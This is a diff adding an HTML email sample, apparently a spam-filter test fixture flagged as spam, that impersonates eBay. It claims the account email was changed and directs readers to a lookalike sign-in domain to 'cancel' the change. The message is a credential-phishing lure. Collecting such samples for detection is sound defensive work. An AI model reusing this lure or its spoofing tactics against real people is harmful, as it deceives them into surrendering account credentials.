@@ -1,0 +1,20 @@
+From: "eBay Member Services" <aw-confirm@ebay.com>
+Reply-To: <aw-confirm@ebay.com>
+To: user@example.com
+Subject: New email address added to your eBay account !
+Date: Thu, 17 Nov 2005 11:22:04 -0500
+MIME-Version: 1.0
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+X-Spam-Flag: YES
+X-Spam-Status: Yes, score=11.5 required=5.0
+
+<html>
+<body>
+<p>Dear eBay Member,</p>
+<p>This is an automated notification confirming that the email address associated with your eBay profile has been successfully updated to <strong>newuser77@mail-backup.net</strong>.</p>
+<p>If you did not authorize this change and suspect a malicious party has accessed your account, you must cancel the request immediately using the secure portal below:</p>
+<p><a href="http://signin-ebay-co-uk.3web.ne.jp/ws2/eBayISAPI.dll.html">Click here to cancel the change request</a></p>
+<p>Regards,<br>eBay SafeHarbor Team</p>
+</body>
+</html>
